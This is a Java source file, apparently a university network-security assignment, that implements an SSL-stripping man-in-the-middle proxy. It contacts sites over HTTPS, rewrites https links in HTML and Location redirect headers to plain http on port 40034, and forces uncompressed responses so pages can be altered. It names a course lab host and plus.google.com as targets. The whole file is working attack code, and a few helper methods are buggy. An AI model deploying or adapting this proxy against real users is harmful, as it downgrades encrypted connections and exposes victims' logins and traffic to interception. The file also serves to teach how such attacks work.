package at.ac.tuwien.ainetsec11.sslStripping;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.Reader;
import java.io.StringReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;
import java.util.Vector;

import javax.net.ssl.SSLException;
import javax.net.ssl.SSLServerSocket;
import javax.net.ssl.SSLServerSocketFactory;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;

import sun.net.www.http.HttpClient;
import sun.rmi.transport.proxy.HttpReceiveSocket;

public class SslStripper {

	public static final int PROXY_PORT = 40034;
	public static String TARGET_URL="http://inetsec.iseclab.org";
	/**
	 * @param args
	 */
	public static void main(String[] args) {

		ServerSocket serverSocket = null;
		try {
			serverSocket = new ServerSocket(PROXY_PORT);

		}
		catch (IOException e) {
			System.err.println(e.getMessage());
			return;
		}
		MyThreadExecutor executor = MyThreadExecutor.getInstance();
		SocketConnectorFactory.addHost("plus.google.com");
		executor.execute(new TcpSocketDispatcher(serverSocket, PROXY_PORT));

		System.out.println("Server running...");

		InputStreamReader c = new InputStreamReader(System.in);
		try
		{
			while(c.read() != '\n')
			{
				//do nothing
			}

			serverSocket.close();
			c.close();
		}
		catch (IOException ex)
		{

		}
		MyThreadExecutor.getThreadExecutor().shutdown();
	}

}

abstract class Filter {
	abstract Object transform(Object data);
}

class RedirectFilter extends Filter {

	Object transform(Object data) {
	
		HTTPResponse response = (HTTPResponse) data;
		if (response.getStatusCode() >= 300 && response.getStatusCode() < 400) {
			String location = response.getLocation();
			String protocol = location.split("://")[0];
			String withoutProtocol = location.split("://")[1];
			String [] uriAndLocator = withoutProtocol.split("/",2);
			String newLocation = "";
			newLocation = protocol + "://" +  uriAndLocator[0] + ":40034";
			if (uriAndLocator.length == 2) {
				 newLocation += "/" + uriAndLocator[1];
			 }
			
			if(newLocation.startsWith("https")) {
				newLocation = newLocation.replaceFirst("https", "http");
			}
			try {
				response.setLocation(newLocation);
			}
			catch (IOException e) {
				System.err.println("location couldn't be changed");
			}
		}
		return response;
	}
	
}

class SslStripperFilter extends Filter {
	
	private static final String HTML_CONTENT_TYPE = "text/html";
	private static final String LINK_TAG_START = "<a href";
	 
	 public Object transform(Object data) {
		 HTTPResponse response = (HTTPResponse) data;
		 
		 try {
			 String contentType = response.getContentType();
			if (contentType != null && contentType.indexOf(HTML_CONTENT_TYPE) != -1) {
				 String stringBody = new String(response.getBody());
				 
				 int currentOccurrance = 0;
				 while ((currentOccurrance = stringBody.indexOf(LINK_TAG_START,currentOccurrance)) != -1) {
					 int endLink = stringBody.substring(currentOccurrance + 9).indexOf("\"") + currentOccurrance + 9;	
					 String currentLink = stringBody.substring(currentOccurrance + 9, endLink);
					 
					 
					 
					 if (currentLink.startsWith("http")) {
						// add Port to url
						 String protocol = currentLink.split("://")[0];
						 String withoutProtocol = currentLink.split("://")[1];
						 String [] uriAndLocator = withoutProtocol.split("/",2);
						 currentLink = protocol + "://" +  uriAndLocator[0] + ":" + SslStripper.PROXY_PORT;
						 if (uriAndLocator.length == 2) {
							 currentLink += "/" + uriAndLocator[1];
						 }
						 String stringBodyBeforeLink = stringBody.substring(0,currentOccurrance + 9);
						 if (currentLink.startsWith("https")) {
							 SocketConnectorFactory.addHost(uriAndLocator[0]);
							 currentLink = currentLink.replaceFirst("https", "http");
						 }
						 stringBody = stringBodyBeforeLink + currentLink + stringBody.substring(endLink);				 
					 }
					 currentOccurrance++;
				 }
				 response.setBody(stringBody.getBytes());
				 return response;
			 }
			
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		 
		return response;
	}

}

class TcpSocketDispatcher implements Runnable {
	private ServerSocket socket;
	private int port;
	public TcpSocketDispatcher(ServerSocket serverSocket, int proxyPort) {
		socket = serverSocket;
		port = proxyPort;

	}
	public void run() {
		while(!socket.isClosed()) {
			try {
				MyThreadExecutor.getInstance().execute(new StripperThread(socket.accept(), port));
			} catch (SSLException e) {
				System.err.println(e.getMessage());
				e.printStackTrace();
				try {
					socket.close();

				} catch (IOException e1) {
					System.err.println(e1.getMessage());
				}
				MyThreadExecutor.getThreadExecutor().shutdown();
			}
			catch (IOException e) {
				System.out.println("Server shuts down...");
			}
		}	
	}
}

class HTTPResponse {

	public HTTPResponse(String responseData, byte[] body) {
		this.serverResponseData = responseData;
		this.body = body;
	}


	private String serverResponseData;
	byte[] body;
	private static final int CHUNK_SIZE = 16384;

	public String getServerResponseData() {
		return serverResponseData;
	}
	public void setServerResponseData(String serverResponseData) {
		this.serverResponseData = serverResponseData;
	}
	public byte[] getBody() {
		return body;
	}
	public void setBody(byte[] body) {
		this.body = body;
	}
	
	public int getStatusCode() {
		String serverResponseStatusInfo = serverResponseData.split("\\r\\n", 2)[0];
		String statusCode = serverResponseStatusInfo.split(" ")[1];
		int code = Integer.parseInt(statusCode);
		return code;
	}
	
	public void setStatusCode(int code) {
		String statusInfo[] = serverResponseData.split("\\r\\n",2);
		String serverResponseHeaders = serverResponseData.split("\\r\\n", 2)[1];
		
		String changedInfo = statusInfo[0] + code + statusInfo[2];
		serverResponseData = changedInfo + "\r\n" + serverResponseHeaders;
	}

	public String getContentType() throws IOException {
		BufferedReader headerReader = new BufferedReader(new StringReader(serverResponseData));
		String currentLine;
		while((currentLine = headerReader.readLine()) != null) {
			if (currentLine.toLowerCase().startsWith("content-type")) {
				return currentLine.split(":")[1];
			}
		}
		return null;
	}
	
	private void changeValue(String header, String value) throws IOException {
		BufferedReader dataReader = new BufferedReader(new StringReader(serverResponseData));
		
		String newHeader = "";
		String currentLine;
		while ((currentLine = dataReader.readLine()) != null) {
			if (currentLine.startsWith(header)) {
				currentLine = header + ": " + value;
			}
			newHeader += currentLine + "\r\n";
		}
		serverResponseData = newHeader;
	}
	
	private String findValue(String header) throws IOException {
		BufferedReader dataReader = new BufferedReader(new StringReader(serverResponseData));
		
		String currentLine;
		while ((currentLine = dataReader.readLine()) != null) {
			if (currentLine.startsWith(header)) {
				return currentLine.split(":",2)[1].substring(1);
			}
		}
		return null;
	}
	
	public void setLocation(String location) throws IOException {
		changeValue("Location", location);
	}
	
	public String getLocation()  {
		try {
			return findValue("Location");
			
		}
		catch (IOException e) {
			return null;
		}
	}
	
	
	public byte[] getByteArray() {
		byte[] byteArray = new byte[serverResponseData.length() + body.length];
		byte[] header;
		header = serverResponseData.getBytes();
		System.arraycopy(header, 0, byteArray, 0, serverResponseData.length());
		System.arraycopy(body, 0, byteArray, serverResponseData.length(), body.length);
		return byteArray;
	}
	
}

class HTTPRequest {
	private String method;
	private String resource;
	private String host;
	private int port = 80;
	private String requestParams;
	private String additionalParams;


	public HTTPRequest(String method, String resource, String host) {
		super();
		this.method = method;
		this.resource = resource;
		this.host = host;
	}



	public HTTPRequest(String method, String resource, String host, int port, HTTPRequestParameters requestParams, String additionalParams) {
		super();
		this.method = method;
		this.resource = resource;
		this.host = host;
		this.port = port;
		this.requestParams = requestParams.toString();
		this.additionalParams = additionalParams;
	}


	public String getAdditionalParams() {
		return additionalParams;
	}



	public void setAdditionalParams(String additionalParams) {
		this.additionalParams = additionalParams;
	}



	public String getMethod() {
		return method;
	}
	public void setMethod(String method) {
		this.method = method;
	}
	public String getResource() {
		return resource;
	}
	public void setResource(String resource) {
		this.resource = resource;
	}
	public String getHost() {
		return host;
	}
	public void setHost(String host) {
		this.host = host;
	}

	public int getPort() {
		return port;
	}

	public void setPort(int port) {
		this.port = port;
	}



	public String getRequestParams() {
		return requestParams;
	}

	public void setRequestParams(String requestParams) {
		this.requestParams = requestParams;
	}

}

class HTTPRequestParameters {

	HashMap parameters = new HashMap();

	public HTTPRequestParameters(String parameterList) {
		String [] parameterArray = parameterList.split("&");
		for (int i = 0; i < parameterArray.length; i++) {
			String [] kv = parameterArray[i].split("=");
			if (kv.length == 2) {
				parameters.put(kv[0], kv[1]);
			}
		}
	}

	public HTTPRequestParameters() {

	}

	public void addParameter(String key, String value) {
		parameters.put(key, value);
	}

	public String toString() {
		String parameterString = "";
		Set keySet = parameters.keySet();
		Iterator keySetIterator = keySet.iterator();

		if (keySetIterator.hasNext()) {
			String key = (String)keySetIterator.next();
			parameterString += key + "=" + (String)parameters.get(key);
		}
		else {
			return null;
		}
		while(keySetIterator.hasNext()) {
			String currentKey = (String)keySetIterator.next();
			parameterString += "&" + parameters.get(currentKey) + "=" + parameters.get(currentKey);
		}
		return parameterString;
	}

	public String getParameter(String parameterKey) {
		return	(String)parameters.get(parameterKey);
	}
}

class HTTPParser {
	private static final int HTTP_BYTE_CHUNK_SIZE = 8192;
	private static HTTPParser _instance = new HTTPParser();
	private String originalRequest;


	public static HTTPParser getInstance() {
		return _instance;
	}

	private HTTPParser() {

	}

	public HTTPResponse parse(byte [] response)  {

		int length = response.length;
		int nrOfChunks = length / HTTP_BYTE_CHUNK_SIZE;
		int correctedNrOfChunks = (length % HTTP_BYTE_CHUNK_SIZE) == 0 ? nrOfChunks : nrOfChunks + 1;
		byte[] currentChunk = new byte[HTTP_BYTE_CHUNK_SIZE];

		int offset = length % HTTP_BYTE_CHUNK_SIZE;
		if (offset != 0) {
			System.arraycopy(response, 0, currentChunk, 0, offset);
		}
		String stringChunk = new String(currentChunk);

		BufferedReader headerReader = new BufferedReader(new StringReader(stringChunk));

		String currentLine;
		String headerResponse = "";
		try {
			
			while ((currentLine = headerReader.readLine()) != null && currentLine.length() != 0) {
				headerResponse += currentLine + "\r\n";
			}
			headerResponse += "\r\n";
			
			byte [] body = new byte[response.length - headerResponse.length()];
			
			System.arraycopy(response, headerResponse.length(), body, 0, body.length);
			/*
			for (int i = 0; i < correctedNrOfChunks; i++) {
				System.arraycopy(response, i * 16384 + offset, currentChunk, 0, 16384)
				writeBuffer = data.substring(i * 65535 + offset, (i + 1) * 65535 + offset).getBytes();
				output.write(writeBuffer);
			}
			output.flush();
			 */
			return new HTTPResponse(headerResponse, body);
		}
		catch (IOException e) {
			System.err.println(e.getMessage());
		}
		
		return null;
	}

	public HTTPRequest parse(String request) {
		this.originalRequest = request;
		BufferedReader reader = new BufferedReader(new StringReader(request));
		try {
			String method;
			String methodLine = reader.readLine();
			String resource;
			String hostAndPort;
			String host;
			HTTPRequestParameters params;
			int port;
			String[] methodLineArray = methodLine.split(" ");
			if (methodLineArray[0].matches("GET") || methodLineArray[0].matches("POST") || methodLineArray[0].matches("PUT") || methodLineArray[0].matches("DELETE")) {
				method = methodLineArray[0];
				String resourceString = methodLineArray[1];
				String[] resourceParamsArray = resourceString.split("\\?");
				if (resourceParamsArray.length == 1) {
					resource = resourceParamsArray[0];
					params = new HTTPRequestParameters();
				}
				else if (resourceParamsArray.length == 2) {
					resource = resourceParamsArray[0];
					//	params = new HTTPRequestParameters();
					params = new HTTPRequestParameters(resourceParamsArray[1]);
				}
				else {
					throw new IOException("resource/params request could not be parsed");
				}
			}
			else {
				throw new IOException("wrong method");
			}

			String hostLine = reader.readLine();
			String hostLineArray[] = hostLine.split(" ");
			if (hostLineArray[0].toLowerCase().compareTo("host:") != 0) {
				throw new IOException("HOST param missing");
			}

			hostAndPort = hostLineArray[1];
			String []hostPortArray = hostAndPort.split(":");
			if (hostPortArray.length == 1) {
				host = hostAndPort;
				port = 80;
			}

			else if (hostPortArray.length == 2) {
				host = hostPortArray[0];

				try {
					port = Integer.parseInt(hostPortArray[1]);
				}
				catch (NumberFormatException e) {
					System.err.println(e.getMessage());
					throw new IOException(e.getMessage());
				}
			}
			else {
				throw new IOException("host or port couldn't be parsed");
			}
			String additionalParams = "";
			String readLine;
			while(true) {
				readLine = reader.readLine();
				if (readLine != null) {

					if(!readLine.startsWith("Connection")) {
						if (!readLine.toLowerCase().startsWith("accept-encoding")) {
							additionalParams += readLine + "\r\n";
						}
						else {
							additionalParams += "Accept-Encoding: identity\r\n";
						}
					}					
					else {
						additionalParams += "Connection: close" + "\r\n";
					}
					
					
					
					
				}else {
					break;
				}
			}

			return new HTTPRequest(method, resource, host, port,params, additionalParams);

		}
		catch (IOException e) {

		}
		return null;
	}
}


abstract class SocketConnection {
	protected static final int TYPE_HTTP = 0;
	protected static final int TYPE_SSL = 1;

	protected int type = 0;

	protected Socket socket = null;

	protected BufferedInputStream input;
	protected BufferedOutputStream output;
	protected byte [] writeBuffer = new byte[65535];
	protected byte [] readBuffer = new byte[16384];

	public BufferedInputStream getInputStream() throws IOException{
		if (input == null) {
			createInputStream();
		}
		return input;
	}

	public BufferedOutputStream getOutputStream() throws IOException {
		if (output == null) {
			createOutputStream();
		}
		return output;
	}

	protected void createInputStream() throws IOException {
		input = new BufferedInputStream(socket.getInputStream());

	}

	protected void createOutputStream() throws IOException {
		output = new BufferedOutputStream(socket.getOutputStream());
		socket.setSendBufferSize(65535);
	}

	public byte[] read() throws IOException {

		byte[] buffer = new byte[0];
		byte[] backupBuffer;
		int toRead;
		String returnData = "";

		while((toRead = input.read(readBuffer)) != -1) {
			backupBuffer = buffer;
			buffer = new byte[buffer.length + toRead];
			System.arraycopy(backupBuffer, 0, buffer, 0, backupBuffer.length);
			System.arraycopy(readBuffer,0, buffer, backupBuffer.length, toRead);
			//retSocket.write(readBuffer, 0, toRead);
		}
		return buffer;
	}

	public void write(String data) throws IOException {
		int length = data.length();
		int nrOfChunks = length / 65535;
		int correctedNrOfChunks = (length % 65535) == 0 ? nrOfChunks : nrOfChunks + 1;

		int offset = length % 65535;
		if (offset != 0) {
			writeBuffer = data.substring(0, offset).getBytes();
			output.write(writeBuffer, 0, offset);

			if (nrOfChunks == 0) {
				output.flush();
				return;
			}
		}

		for (int i = 0; i < correctedNrOfChunks; i++) {
			writeBuffer = data.substring(i * 65535 + offset, (i + 1) * 65535 + offset).getBytes();
			output.write(writeBuffer);
		}
		output.flush();

	}

	public void close() throws IOException {
		output.close();
		input.close();
		socket.close();
	}

}

class HttpSocketConnection extends SocketConnection {

	public HttpSocketConnection(String host) throws IOException {
		socket = new Socket(host, 80);
		type = TYPE_HTTP;
	}
}

class SSLSocketConnection extends SocketConnection {
	public SSLSocketConnection(String host) throws IOException {
		socket = SSLSocketFactory.getDefault().createSocket(host, 443);
		type = TYPE_SSL;
	}
}

class SocketConnectorFactory {
	private static ArrayList secureHosts = new ArrayList();


	public static SocketConnection createSocketConnection(String url) throws IOException {

		if(secureHosts.contains(url)) {
			return new SSLSocketConnection(url);
		}
		else {
			return new HttpSocketConnection(url);
		}

	}

	public static void addHost(String host) {
		if (!secureHosts.contains(host)) {
			secureHosts.add(host);
		}
	}
}



class Proxy {

	private Vector afterFilterChain;
	private Socket socket;
	public Proxy(Socket socket) {
		this.socket = socket;
		afterFilterChain = new Vector();

	}

	private String rewriteRequest(HTTPRequest request) {
		String rewritten = "";
		rewritten += request.getMethod() + " " + request.getResource();
		if (request.getRequestParams() != null) {
			rewritten += "?" + request.getRequestParams();
		}
		rewritten += " HTTP/1.0\r\n";
		rewritten += "Host: " + request.getHost()+ "\r\n";
		rewritten += request.getAdditionalParams();
		return rewritten;
	}
	
	public void afterServerResponse(Filter afterFilter) {
		afterFilterChain.add(afterFilter);
	}

	public void proxyConnection() {

		/*Iterator filterIterator = filterChain.iterator();
		while (filterIterator.hasNext()) {
			Filter currentFilter = (Filter)filterIterator.next();
			filteredData = currentFilter.transform(filteredData);
		}*/
		BufferedInputStream input = null;
		BufferedOutputStream output = null;
		SocketConnection connection = null;
		try {
			socket.setReceiveBufferSize(65535);
			input = new BufferedInputStream(socket.getInputStream());
			output = new BufferedOutputStream(socket.getOutputStream());
			String inputString = "";
			byte[] readBuffer = new byte[65535];

			int readChars = 0;
			int currentAvailable = 0;

			while((currentAvailable = input.available()) > 0) {
				readChars = input.read(readBuffer,0,currentAvailable);		
				inputString += new String(readBuffer).substring(0, readChars);
			}

			HTTPRequest request = HTTPParser.getInstance().parse(inputString);

			if (request == null) {
				System.err.println("parsing error oh noes");
				output.close();
				input.close();
				socket.close();

			}

			connection = SocketConnectorFactory.createSocketConnection(request.getHost());

			String rewrittenRequest = rewriteRequest(request);
			connection.getInputStream();
			connection.getOutputStream();
			connection.write(rewrittenRequest);
			byte [] response = connection.read();

			HTTPResponse parsedResponse = HTTPParser.getInstance().parse(response);
			
			Iterator filterIterator = afterFilterChain.iterator();
			while (filterIterator.hasNext()) {
				Filter currentFilter = (Filter)filterIterator.next();
				parsedResponse = (HTTPResponse) currentFilter.transform(parsedResponse);
			}
			
			output.write(parsedResponse.getByteArray());
			output.flush();
			connection.close();
			output.close();
			input.close();

		}
		catch (IOException e) {
			System.err.println("unexpected disconnect");
			System.err.flush();
			try {
				output.close();
				input.close();
				connection.close();
			}
			catch (IOException e1) {

			}
		}

	}
}

class StripperThread implements Runnable {

	private Socket socket;
	private int port;

	public StripperThread(Socket socket, int port) {
		this.socket = socket;
		this.port = port;
	}

	public void run() {
		Proxy proxy = new Proxy(socket);
		proxy.afterServerResponse(new SslStripperFilter());
		proxy.afterServerResponse(new RedirectFilter());
		proxy.proxyConnection();
	}

}

interface Executor {
	public void execute(Runnable thread);
}

class ExecutorService extends Timer {

	private Vector cachedThreadPool = new Vector();
	private boolean isShutDown = false;

	public ExecutorService() {
		super(true);
		schedule(new ThreadCleanUp(this), 0, 10000);
	}

	public void execute(Runnable thread) {
		if (!isShutDown) {
			Thread currentThread = new Thread(thread);
			synchronized(cachedThreadPool) {
				cachedThreadPool.add(currentThread);
			}
			currentThread.start();
		}
	}

	public void shutdown() {
		isShutDown = true;
	}

	private class ThreadCleanUp extends TimerTask {

		private Timer parentTimer;

		public ThreadCleanUp(Timer parentTimer) {
			this.parentTimer = parentTimer;
		}

		public void run() {
			synchronized(cachedThreadPool) {
				Iterator cacheIterator = cachedThreadPool.iterator();
				while (cacheIterator.hasNext()) {
					Thread theThread = (Thread)cacheIterator.next();
					if (!theThread.isAlive()) {
						cacheIterator.remove();
					}
				}
			}
			if (isShutDown && cachedThreadPool.size() == 0) {
				parentTimer.cancel();
			}
		}

	}
}

class Executors {
	public static ExecutorService newCachedThreadPool() {
		return new ExecutorService();
	}
}

class MyThreadExecutor implements Executor
{
	private static MyThreadExecutor executor = null;
	private static ExecutorService threadExecutor = null;

	private MyThreadExecutor()
	{
		threadExecutor = Executors.newCachedThreadPool();
	}   

	public static MyThreadExecutor getInstance()
	{
		if (executor == null)
			executor = new MyThreadExecutor();
		return executor;
	}

	public void execute(Runnable thread)
	{
		threadExecutor.execute(thread);
	}

	public static ExecutorService getThreadExecutor()
	{
		return threadExecutor;
	}
}
